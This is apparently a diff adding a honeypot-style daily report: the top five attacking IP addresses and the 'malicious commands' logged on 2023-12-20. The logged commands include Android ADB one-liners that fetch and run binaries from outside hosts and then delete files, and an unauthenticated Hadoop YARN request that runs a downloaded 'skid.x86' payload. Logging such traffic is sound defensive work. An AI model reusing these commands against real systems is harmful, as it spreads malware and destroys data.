@@ -1,0 +1,22 @@
+Top 5 IPs for 2023-12-20:
+
+122.155.5.50
+43.135.155.251
+36.33.43.77
+166.131.184.178
+124.221.19.124
+
+Malicious commands seen:
+cd /data/local/tmp/; busybox wget http://176.97.210.229/bash.arm7; chmod 777 bash.arm7; ./bash.arm7 taco; rm -rf *
+cd /data/local/tmp/; busybox wget http://84.54.51.141/perc0.sh; chmod 777 perc0.sh; sh perc0.sh; tftp 84.54.51.141 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 84.54.51.141; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
+cd /data/local/tmp/; rm *; busybox wget http://45.95.147.171/arm7; chmod 777 arm7; ./arm7 ADB
+
+POST /ws/v1/cluster/apps HTTP/1.1
+Host: HOST
+User-Agent: Hello World
+Accept: */*
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 287
+
+{\"application-id\": \"\", \"application-name\": \"get-shell\", \"am-container-spec\": {\"commands\": {\"command\": \"cd /tmp; rm -rf skid.x86; wget http://193.222.96.26/skid.x86; curl http://193.222.96.26/skid.x86 --output skid.x86; chmod 777 skid.x86; ./skid.x86 Yarn;\"}}, \"application-type\": \"YARN\"}
